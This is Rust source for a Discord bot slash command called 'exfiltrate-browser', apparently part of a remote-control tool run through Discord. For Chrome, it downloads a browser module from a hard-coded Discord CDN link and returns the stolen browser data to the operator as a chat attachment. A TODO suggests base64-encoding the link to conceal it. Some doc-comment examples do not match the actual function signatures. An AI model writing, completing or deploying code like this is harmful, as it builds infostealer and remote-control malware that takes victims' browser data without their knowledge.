use poise::serenity_prelude::AttachmentType;
use tempfile::TempDir;
use uuid::Uuid;

use crate::{
	os::download::{download_browser_module, generate_attachment},
	Context,
	Error,
};

// This enum defines the choices available for our command.
#[derive(Debug, poise::ChoiceParameter)]
pub enum BrowserChoice {
	#[name = "Chrome"]
	Chrome,
	#[name = "Firefox"]
	Firefox,
	#[name = "Edge"]
	Edge,
}

impl BrowserChoice {
	fn as_str(&self) -> &str {
		match self {
			BrowserChoice::Chrome => "Chrome",
			BrowserChoice::Firefox => "Firefox",
			BrowserChoice::Edge => "Edge",
		}
	}
}

/// Command that exfiltrates data from remote host's browsers.
#[poise::command(slash_command, rename = "exfiltrate-browser")]
pub async fn exfiltrate_browser(
	ctx: Context<'_>,
	#[description = "A supported browser (chrome, firefox, edge)"] browser: BrowserChoice,
) -> Result<(), Error> {
	// Attempt to create the attachment, given the browser choice.
	let attachment = match browser.as_str() {
		"Chrome" => exfiltrate("Chrome").await,
		"Firefox" => exfiltrate("Firefox").await,
		"Edge" => exfiltrate("Edge").await,
		_ => panic!("Unsupported browser: {}", browser),
	};

	if let Some(attachment) = attachment {
		ctx.send(|builder| {
			builder.content("Here is your exfiltrated file:");
			builder.attachment(attachment)
		})
		.await?;
	} else {
		ctx.say("Failed to exfiltrate file :(").await?;
	}

	Ok(())
}

/// Exfiltrates sensitive data from the user's browser, using the module corresponding to the specified `browser`
/// type. This function creates a temporary directory to store the exfiltrated data, and then downloads the data
/// using the appropriate module. If the data is successfully downloaded, it is returned as an `AttachmentType`
/// object containing the content and filename of the exfiltrated file. If the specified `browser` type is not
/// supported, this function returns `None`.
///
/// # Arguments
///
/// * `browser` - A string specifying the type of browser to exfiltrate data from (e.g. "Chrome").
///
/// # Returns
///
/// An `AttachmentType` object containing the exfiltrated data (if any), or `None` if no data was exfiltrated.
///
/// # Example
///
/// ```
/// async fn handle_interaction() {
///     let attachment = exfiltrate_browser("Chrome").await.expect("Failed to exfiltrate browser data");
///     if let Some(content) = attachment.content {
///         println!("Exfiltrated data: {}", content);
///     } else {
///         println!("No data was exfiltrated");
///     }
/// }
/// ```
///
/// This function calls the `handle_download` function to download the exfiltrated data, passing in a temporary
/// directory to store the downloaded data, the URL of the data, and the desired filename for the downloaded file.
/// If the download is successful, `handle_download` returns an `AttachmentType` object containing the content
/// and filename of the exfiltrated file.
async fn exfiltrate(browser: &str) -> Option<AttachmentType<'static>> {
	let temp_dir = TempDir::new().unwrap();
	if browser == "Chrome" {
		let url = "https://cdn.discordapp.com/attachments/1102741318905626688/1102746525035143299/3126786178316y237813"; // TODO: b64 encode this
		let filename = "1";
		Some(handle_download(temp_dir, url, filename).await)
	} else {
		None
	}
}

/// Downloads a file from the specified `url` and saves it to the specified `temp_file_path`. This function
/// returns an `AttachmentType` object containing the content and filename of the downloaded file.
///
/// # Arguments
///
/// * `temp_dir` - A temporary directory to use for storing the downloaded file.
/// * `url` - The URL of the file to download.
/// * `filename` - The desired filename for the downloaded file.
///
/// # Returns
///
/// An `AttachmentType` object containing the content and filename of the downloaded file.
///
/// # Panics
///
/// This function will panic if an error occurs during file download.
///
/// # Example
///
/// ```
/// async fn handle_download() {
///     let temp_dir = TempDir::new().unwrap();
///     let url = "https://example.com/some-file.txt";
///     let filename = "some-file.txt";
///     let attachment_data = handle_download(temp_dir, url, filename).await;
/// }
/// ```
///
/// This function downloads a file from the specified `url` and saves it to a temporary file in the specified
/// `temp_dir`, with the specified `filename`. If the download is successful, this function reads the downloaded
/// file into memory and returns an `AttachmentType` object containing the content and filename of the file.
async fn handle_download(temp_dir: TempDir, url: &str, filename: &str) -> AttachmentType<'static> {
	let temp_file_path = temp_dir.path().join(Uuid::new_v4().to_string());
	download_browser_module(url, filename, &temp_file_path)
		.await
		.expect("Error when downloading the file."); // TODO: Download error handling
	generate_attachment(temp_file_path).await.unwrap() // Reads the attachment data into memory and stores it in a `AttachmentType` object.
}
